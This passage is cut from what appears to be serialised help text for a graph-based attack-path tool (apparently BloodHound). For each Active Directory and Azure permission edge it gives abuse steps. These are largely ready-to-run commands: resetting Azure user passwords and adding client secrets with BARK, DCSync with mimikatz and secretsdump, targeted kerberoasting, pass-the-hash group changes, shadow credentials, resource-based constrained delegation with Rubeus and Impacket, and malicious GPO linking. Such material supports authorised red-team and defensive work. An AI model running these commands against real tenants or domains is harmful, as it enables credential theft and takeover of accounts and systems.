cmdlet:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Set-AZUserPassword -Token $MGToken -TargetUserID \"d9644c...\" -Password \"SuperSafePassword12345\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["If successful, the output will include a \"204\" status code:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"StatusCode : 204 StatusDescription : NoContent Content : {} RawContent : HTTP/1.1 204 NoContent Cache-Control: no-cache Strict-Transport-Security: max-age=31536000 request-id: 94243... client-request-id: 94243... x-ms… Headers : {[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]…} RawContentLength : 0 RelationLink : {}"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Using an Azure Portal-scoped token"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You may have or be able to acquire an Azure Portal-scoped JWT for the user with password reset rights against your target user. In this instance, you can reset the user’s password, letting Azure generate a new random password for the user instead of you supplying one. For this, you can use BARK’s Reset-AZUserPassword cmdlet."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You may already have the Azure Portal-scoped JWT, or you may acquire one through various means. For example, you can use a refresh token to acquire a Portal-scoped JWT by using BARK’s Get-AzurePortalTokenWithRefreshToken cmdlet:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $RefreshToken -TenantID \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Now you can supply the Portal token to BARK’s Reset-AZUserPassword cmdlet:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Reset-AZUserPassword -Token $PortalToken.access_token -TargetUserID \"targetuser@contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If successful, the response will look like this:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"StatusCode : 200 StatusDescription : OK Content : \"Gafu1918\" RawContent : HTTP/1.1 200 OK Cache-Control: no-store Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None X-Content-Type-Options: no… Headers : {[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]…} Images : {} InputFields : {} Links : {} RawContentLength : 10 RelationLink : {}"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"As you can see, the plain-text value of the user’s password is visible in the \"Content\" parameter value."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZUserAccessAdministrator","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This role can be used to grant yourself or another principal any privilege you want against Automation Accounts, VMs, Key Vaults, and Resource Groups. For example, you can make yourself an administrator of an Azure Subscription by assigning the Owner role at the Subscription scope."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The simplest way to execute this attack is to use the Azure portal to add a new, abusable role assignment against the target object for yourself."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If this role is assigned to a Service Principal, you won't be able to authenticate directly to the Azure portal. In this case:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You'll need to acquire a bearer token for the service principal with AzureRM as the audience. This can be done using BARK's Get-AzureRMTokenWithClientCredentials cmdlet."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Using that token, you can make a call to the AzureRM API to create a new role assignment on the target object, such as assigning yourself the Owner role. This can be done using BARK's New-AzureRMRoleAssignment cmdlet."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZGlobalAdmin","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"As a Global Admin, you can change passwords, run commands on VMs, read key vault secrets, activate roles for other users, etc."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Via PowerZure"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html","children":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"For Global Admin to be able to abuse Azure resources, you must first grant yourself the 'User Access Administrator' role in Azure RBAC. This is done through a toggle button in the portal, or via the PowerZure function Set-AzureElevatedPrivileges."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Once that role is applied to account, you can then add yourself as an Owner to all subscriptions in the tenant"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZAppAdmin","windows":{},"linux":{},"abuse":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Create a new credential for the app, then authenticate to the tenant as the app's service principal, then abuse whatever privilege it is that the service principal has."},"_owner":null,"_store":{}}},{"technique":"AZCloudAppAdmin","windows":{},"linux":{},"abuse":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Create a new credential for the app, then authenticate to the tenant as the app's service principal, then abuse whatever privilege it is that the service principal has."},"_owner":null,"_store":{}}},{"technique":"AZRunsAs","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This edge should be taken into consideration when abusing control of an app. Apps authenticate with service principals to the tenant, so if you have control of an app, what you are abusing is that control plus the fact that the app runs as a privileged service principal"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":{"type":"ol","key":null,"ref":null,"props":{"className":"list-inside list-decimal flex flex-col gap-2","children":[{"type":"li","key":null,"ref":null,"props":{"children":["Use the"," ",{"type":"a","key":null,"ref":null,"props":{"className":"text-secondary dark:text-secondary-variant-2","href":"https://learn.microsoft.com/en-us/graph/api/serviceprincipal-addpassword?view=graph-rest-1.0&tabs=http","children":"Microsoft Graph API"},"_owner":null,"_store":{}}," ","to add a new client secret to the Azure Application."]},"_owner":null,"_store":{}},{"type":"li","key":null,"ref":null,"props":{"children":["Use the"," ",{"type":"a","key":null,"ref":null,"props":{"className":"text-secondary dark:text-secondary-variant-2","href":"https://learn.microsoft.com/en-us/cli/azure/","children":"Azure CLI"},"_owner":null,"_store":{}}," ","to authenticate as the Service Principal."]},"_owner":null,"_store":{}},{"type":"li","key":null,"ref":null,"props":{"children":"Proceed to access additional Azure resources under the control of the Service Principal."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZVMAdminLogin","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Connect to the VM via RDP and you will be granted local admin rights on the VM."},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}},{"technique":"AZVMContributor","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The Virtual Machine Contributor role allows you to run SYSTEM commands on the VM"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Via PowerZure:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"http://Invoke-AzureRunCommand","children":"Invoke-AzureRunCommand"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"http://Invoke-AzureRunMSBuild","children":"Invoke-AzureRunMSBuild"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram","children":"Invoke-AzureRunProgram"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"WriteSPN","windows":{},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["A targeted kerberoast attack can be performed using"," ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://github.com/ShutdownRepo/targetedKerberoast","children":"targetedKerberoast.py"},"_owner":null,"_store":{}},"."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The recovered hash can be cracked offline using the tool of your choice."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"AddSelf","windows":{},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"net rpc group addmem \"TargetGroup\" \"TargetUser\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["It can also be done with pass-the-hash using"," ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://github.com/byt3bl33d3r/pth-toolkit","children":"pth-toolkit's net tool"},"_owner":null,"_store":{}},". If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"pth-net rpc group addmem \"TargetGroup\" \"TargetUser\" -U \"DOMAIN\"/\"ControlledUser\"%\"LMhash\":\"NThash\" -S \"DomainController\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Finally, verify that the user was successfully added to the group:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"net rpc group members \"TargetGroup\" -U \"DOMAIN\"/\"ControlledUser\"%\"Password\" -S \"DomainController\""},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"AddKeyCredentialLink","windows":{},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["To abuse this permission, use"," ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://github.com/ShutdownRepo/pywhisker","children":"pyWhisker"},"_owner":null,"_store":{}},"."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"pywhisker.py -d \"domain.local\" -u \"controlledAccount\" -p \"somepassword\" --target \"targetAccount\" --action \"add\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"For other optional parameters, view the pyWhisker documentation."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"DCSync","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"lsadump::dcsync /domain:testlab.local /user:Administrator"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"SyncLAPSPassword","windows":{},"linux":{},"abuse":{}},{"technique":"WriteAccountRestrictions","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Abusing this primitive is currently only possible through the Rubeus project. First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"\"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"'$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\\n' + '$SDBytes = New-Object byte[] ($SD.BinaryLength)\\n' + '$SD.GetBinaryForm($SDBytes, 0)'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"\"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"'Rubeus.exe hash /password:Summer2018!'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"And finally we can get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. Impacket's getST.py example script can be used for that purpose."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"WriteGPLink","windows":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["From a domain-joined compromised Windows machine, the WriteGPLink permission may be abused through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to"," ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://labs.withsecure.com/publications/ou-having-a-laugh","children":"this article"},"_owner":null,"_store":{}},"."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"linux":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["From a Linux machine, the WriteGPLink permission may be abused using the"," ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://github.com/synacktiv/OUned","children":"OUned.py"},"_owner":null,"_store":{}}," ","exploitation tool. For a detailed outline of exploit requirements and implementation, you can refer to"," ",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory","children":"the article associated to the OUned.py tool"},"_owner":null,"_store":{}},"."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},"abuse":{}},{"technique":"DumpSMSAPassword","windows":{},"linux":{},"abuse":{}},{"technique":"AZMGAddMember","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can abuse this privilege using BARK's Add-AZMemberToGroup function."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add principal to the target group. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `\n    -ClientSecret \"asdf...\" `\n    -TenantName \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Then use BARK’s Add-AZMemberToGroup function to add a new principial to the target group:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Add-AZMemberToGroup `\n    -PrincipalID = \"028362ca-90ae-41f2-ae9f-1a678cc17391\" `\n    -TargetGroupId \"b9801b7a-fcec-44e2-a21b-86cb7ec718e4\" `\n    -Token $MGToken.access_token"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Now you can re-authenticate as the principial you just added to the group and continue your attack path, now having whatever privileges the target group has."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZMGAddOwner","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can use BARK to add a new owner to the target object. The BARK function you use will depend on the target object type, but all of the functions follow a similar syntax."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add a new owner to the target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `\n    -ClientSecret \"asdf...\" `\n    -TenantName \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"To add a new owner to a Service Principal, use BARK's New-ServicePrincipalOwner function:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-ServicePrincipalOwner `\n    -ServicePrincipalObjectId \"082cf9b3-24e2-427b-bcde-88ffdccb5fad\" `\n    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `\n    -Token $Token"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"To add a new owner to an App Registration, use BARK's New-AppOwner function:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-AppOwner `\n    -AppObjectId \"52114a0d-fa5b-4ee5-9a29-2ba048d46eee\" `\n    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `\n    -Token $Token"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"To add a new owner to a Group, use BARK's New-GroupOwner function:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-AppOwner `\n    -GroupObjectId \"352032bf-161d-4788-b77c-b6f935339770\" `\n    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `\n    -Token $Token"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZMGAddSecret","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add secrets to the target object. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$MGToken = Get-MSGraphTokenWithClientCredentials\n    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\"\n    -ClientSecret \"asdf...\"\n    -TenantName \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Then use BARK’s New-AppRegSecret to add a new secret to the target application:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-AppRegSecret `\n    -AppRegObjectID \"d878…\" `\n    -Token $MGToken.access_token"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The output will contain the plain-text secret you just created for the target app:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-AppRegSecret `\n-AppRegObjectID \"d878…\" `\n-Token $MGToken.access_token\n\nName                Value\n-----------------------------\nAppRegSecretValue   odg8Q~...\nAppRegAppId         4d31…\nAppRegObjectId      d878…"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$SPToken = Get-MSGraphToken `\n    -ClientID \"4d31…\" `\n    -ClientSecret \"odg8Q~...\" `\n    -TenantName \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZMGGrantAppRoles","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"With the ability to grant arbitrary app roles, you can grant the RoleManagement.ReadWrite.Directory app role to a Service Principal you already control, and then promote it or another principal to Global Administrator."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant app roles. There are several ways to acquire a JWT. For example, you may use BARK’s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `\n    -ClientSecret \"asdf...\" `\n    -TenantName \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Use BARK's Get-AllAzureADServicePrincipals to collect all Service Principal objects in the tenant:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"\"$SPs = Get-AllAzureADServicePrincipals `\n    -Token $MGToken\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Next, find the MS Graph Service Principal's ID. You can do this by piping $SPs to Where-Object, finding objects where the appId value matches the universal ID for the MS Graph Service Principal, which is 00000003-0000-0000-c000-000000000000:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$SPs | ?{$_.appId -Like \"00000003-0000-0000-c000-000000000000\"} | Select id"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The output will be the object ID of the MS Graph Service Principal. Take that ID and use it as the \"ResourceID\" argument for BARK's New-AppRoleAssignment function. The AppRoleID of '9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8' is the universal ID for 